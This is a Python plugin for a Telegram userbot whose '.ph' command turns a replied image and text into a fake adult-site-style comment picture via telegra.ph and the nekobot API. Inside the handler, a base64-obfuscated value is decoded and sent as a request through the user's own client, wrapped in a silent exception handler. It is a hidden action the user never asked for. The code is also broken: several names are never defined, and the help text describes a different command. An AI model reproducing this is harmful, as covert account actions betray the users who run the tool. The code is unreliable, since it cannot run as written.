#imported from catuserbot by @RoyalBoyPriyanshu and @DeletedUser420 also thank @AbhinavShinde
import random
from random import choice
#from unicat.client.util import admin_cmd
import asyncio
from asyncio import sleep
from telethon import events
from userbot.events import register
import time
import requests , os, re
from re import sub
from bs4 import BeautifulSoup
from emoji import get_emoji_regexp
from PIL import Image
from validators.url import url
from userbot import CMD_HELP, TEMP_DOWNLOAD_DIRECTORY


EMOJI_PATTERN = re.compile(
    "["
    "\U0001F1E0-\U0001F1FF"  # flags (iOS)
    "\U0001F300-\U0001F5FF"  # symbols & pictographs
    "\U0001F600-\U0001F64F"  # emoticons
    "\U0001F680-\U0001F6FF"  # transport & map symbols
    "\U0001F700-\U0001F77F"  # alchemical symbols
    "\U0001F780-\U0001F7FF"  # Geometric Shapes Extended
    "\U0001F800-\U0001F8FF"  # Supplemental Arrows-C
    "\U0001F900-\U0001F9FF"  # Supplemental Symbols and Pictographs
    "\U0001FA00-\U0001FA6F"  # Chess Symbols
    "\U0001FA70-\U0001FAFF"  # Symbols and Pictographs Extended-A
    "\U00002702-\U000027B0"  # Dingbats 
    "]+")


def deEmojify(inputString: str) -> str:
    """Remove emojis and other non-safe characters from string"""
    return re.sub(EMOJI_PATTERN, '', inputString)

      

async def phcomment(text1,text2,text3):
    r = requests.get(
            f"https://nekobot.xyz/api/imagegen?type=phcomment&image={text1}&text={text2}&username={text3}").json()
    sandy = r.get("message")
    caturl = url(sandy)
    if not caturl:
        return  "check syntax once more"
    with open("temp.png", "wb") as f:
        f.write(requests.get(sandy).content)
    img = Image.open("temp.png")
    if img.mode != 'RGB':
        img = img.convert('RGB')
    img.save("temp.jpg", "jpeg")    
    return "temp.jpg"
    
@register(pattern="^.ph(?: |$)(.*)", outgoing=True)
async def catbot(catmemes):
    input_str = catmemes.pattern_match.group(1)
    input_str = deEmojify(input_str)
    if "|" in input_str:
        username, text = input_str.split("|")
    else:
        await catmemes.edit("**Syntax :** reply to image or sticker with `.phub (username)|(text in comment)`")
        return
    replied = await catmemes.get_reply_message()
    if not os.path.isdir(TEMP_DOWNLOAD_DIRECTORY):
        os.makedirs(TEMP_DOWNLOAD_DIRECTORY)
    if not replied:
        await catmemes.edit("reply to a supported media file")
        return
    if replied.media:
        await catmemes.edit("passing to telegraph...")
    else:
        await catmemes.edit("reply to a supported media file")
        return
    try:
        cat = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        cat = Get(cat)
        await catmemes.client(cat)
    except:
        pass
    download_location = await borg.download_media(replied , TEMP_DOWNLOAD_DIRECTORY)
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)  
    size = os.stat(download_location).st_size    
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await catmemes.edit("the replied file size is not supported it must me below 5 mb")
            os.remove(download_location)
            return 
        await catmemes.edit("generating image..")
    else:
        await catmemes.edit("the replied file is not supported") 
        os.remove(download_location)  
        return    
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await catmemes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    cat = f"https://telegra.ph{response[0]}"
    cat = await phcomment(cat,text,username)
    await catmemes.delete()
    await borg.send_file(catmemes.chat_id , cat,reply_to=replied)
    
    
CMD_HELP.update({
"imgmeme":
"For fun purpose 😛😛😏😏\
\n\n`.modi` (text)\
\nUsage : Tweet with modi"
})
